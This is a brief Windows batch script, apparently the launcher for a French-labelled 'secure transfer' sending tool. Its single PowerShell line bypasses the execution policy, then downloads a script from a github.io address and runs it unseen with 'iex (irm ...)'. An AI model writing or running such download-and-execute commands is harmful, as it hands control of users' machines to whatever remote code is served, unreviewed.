@echo off
chcp 65001 >nul
title Transfert securise - Envoi
set "TS_ARG=%~1"
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; iex (irm https://maltablender.github.io/transfert/e.txt)"
